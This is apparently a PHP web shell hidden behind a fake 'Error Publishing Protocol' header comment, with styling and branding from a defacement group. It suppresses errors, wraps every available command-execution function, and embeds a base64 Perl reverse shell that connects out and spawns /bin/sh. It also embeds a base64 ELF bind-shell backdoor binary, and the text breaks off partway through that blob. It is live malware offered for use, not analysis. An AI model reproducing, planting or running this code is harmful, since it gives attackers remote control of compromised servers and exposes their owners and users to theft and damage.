<?php
/**
 * Error Publishing Protocol
 *
 * @version 1.0.5-dc
 */

/**
 * 500 is handling an Error Publishing Protocol request.
 *
 * @var bool
 */

@error_reporting(0);
@set_time_limit(0); 


$sh_id = "BArNEr";
$sh_ver = "Powered by FULLMAGIC COMMUNITY";
$sh_name = base64_decode($sh_id).$sh_ver;
$sh_mainurl = "http://brb.is/.../";
$html_start = '<html><head>
<p align="center">
<title>'.getenv("").'  '.$sh_id.'</title><link REL="SHORTCUT ICON" HREF="http://ppa.scisoc.or.th/.../indonesia.gif"></link>
<style type="text/css">
<!--
body,table { font-family:verdana;font-size:11px;color:aqua;background-color:black; }
table { width:100%; }
table,td { border:1px solid black;margin-top:2;margin-bottom:2;padding:5px; }
a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#99CCFF; }
input,select,option { font:8pt tahoma;color:red;margin:2;border:1px solid lime; }
textarea { color:lime;font:verdana bold;border:1px solid lime;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:8pt tahoma;padding:5px; border:3px solid black; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#00FF00; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid black; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid green; }
.mainpanel input,select,option { border:1px solid black;margin:0; }
input[type="submit"] { border:1px solid lime; }
input[type="text"] { padding:3px;}
.shell { background-color:black;color:black;padding:5px; }
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
textarea,.mainpanel input,select,option { background-color:#000000; }
// -->
</style>
</head>
<body>
';
$host_allow = array("*"); 
$accessdeniedmess = "<body bgcolor=black><a href=\"$sh_mainurl\"><font color=lime>".$sh_name."</font></a>: <font color=red>access denied</font></body>";
$gzipencode = TRUE;
$filestealth = TRUE; 
$curdir = "./";
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = ""; 
$sort_default = "0a"; 
$sort_save = TRUE; 
$sess_cookie = "bogelvars"; 
$usefsbuff = TRUE; 
$copy_unset = FALSE; 
$hexdump_lines = 8;
$hexdump_rows = 24;
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc)) {
  $disablefunc = str_replace(" ","",$disablefunc);
  $disablefunc = explode(",",$disablefunc);
}
function get_phpini() {
  function U_wordwrap($str) {
    $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
    return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
  }
  function U_value($value) {
    if ($value == '') return '<i>no value</i>';
    if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
    if ($value === null) return 'NULL';
    if (@is_object($value)) $value = (array) $value;
    if (@is_array($value)) {
      @ob_start();
      print_r($value);
      $value = @ob_get_contents();
      @ob_end_clean();
    }
    return U_wordwrap((string) $value);
  }
  if (@function_exists('ini_get_all')) {
    $r = "";
    echo "<table><tr class=barheader><td>Directive</td><td>Local Value</td><td>Global Value</td></tr>";
    foreach (@ini_get_all() as $key=>$value) {
      $r .= "<tr><td>".$key."</td><td><div align=center>".U_value($value['local_value'])."</div></td><td><div align=center>".U_value($value['global_value'])."</div></td></tr>";
    }
    echo $r;
    echo "</table>";
  }
}
function disp_drives($curdir,$surl) {
  $letters = "";
  $v = explode("\\",$curdir);
  $v = $v[0];
  foreach (range("A","Z") as $letter) {
    $bool = $isdiskette = $letter == "A";
    if (!$bool) {$bool = is_dir($letter.":\\");}
    if ($bool) {
      $letters .= "<a href=\"".$surl."x=ls&d=".urlencode($letter.":\\")."\"".
      ($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"")."> [";
      if ($letter.":" != $v) {$letters .= $letter;}
      else {$letters .= "<font color=yellow>".$letter."</font>";}
      $letters .= "]</a> ";
    }
  }
  if (!empty($letters)) {Return $letters;}
  else {Return "None";}
}
if (is_callable("disk_free_space")) {
  function disp_freespace($curdrv) {
    $free = disk_free_space($curdrv);
    $total = disk_total_space($curdrv);
    if ($free === FALSE) {$free = 0;}
    if ($total === FALSE) {$total = 0;}
    if ($free < 0) {$free = 0;}
    if ($total < 0) {$total = 0;}
    $used = $total-$free;
    $free_percent = round(100/($total/$free),2)."%";
    $free = view_size($free);
    $total = view_size($total);
    return "$free of $total ($free_percent)";
  }
}
if (!function_exists("myshellexec")) {
  if(is_callable("popen")) {
    function myshellexec($cmd) {
      if (!($p=popen("($cmd)2>&1","r"))) { return "popen Disabled!"; }
      while (!feof($p)) {
        $line=fgets($p,1024);
        $out .= $line;
      }
      pclose($p);
      return $out;
    }
  } else {
    function myshellexec($cmd) {
      global $disablefunc;
      $result = "";
      if (!empty($cmd)) {
        if (is_callable("exec") and !in_array("exec",$disablefunc)) {
          exec($cmd,$result);
          $result = join("\n",$result);
        } elseif (($result = $cmd) !== FALSE) {
        } elseif (is_callable("system") and !in_array("system",$disablefunc)) {
          $v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;
        } elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {
          $v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;
        } elseif (is_resource($fp = popen($cmd,"r"))) {
          $result = "";
          while(!feof($fp)) { $result .= fread($fp,1024); }
          pclose($fp);
        }
      }
      return $result;
    }
  }
}
function ex($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}
function which($pr) {
  $path = ex("which $pr");
  if(!empty($path)) { return $path; } else { return $pr; }
}

$back_connect_pl = "IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRjbWQ9ICJzbGVlcCI7CiRzeXN0ZW09ICdlY2hvICJgdW5hbWUgLWFgIjtlY2hvICJgaWRgIjtlY2hvICJgY2F0IC9ldGMvaXNzdWVgIjtlY2hvICJgY2F0IC9wcm9jL3N5cy92bS9tbWFwX21pbl9hZGRyYCI7SElTVEZJTEU9L2Rldi9udWxsIC9iaW4vc2ggLWknOwokMD0kY21kOwokdGFyZ2V0PSRBUkdWWzBdOwokcG9ydD0kQVJHVlsxXTsKJGlhZGRyPWluZXRfYXRvbigkdGFyZ2V0KSB8fCBkaWUoIkVycm9yOiAkIVxuIik7CiRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgJGlhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7CiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKY29ubmVjdChTT0NLRVQsICRwYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsKb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOwpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7CnN5c3RlbSgkc3lzdGVtKTsKY2xvc2UoU1RESU4pOwpjbG9zZShTVERPVVQpOwpjbG9zZShTVERFUlIpOw";
$backdoor = "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAA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L2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ1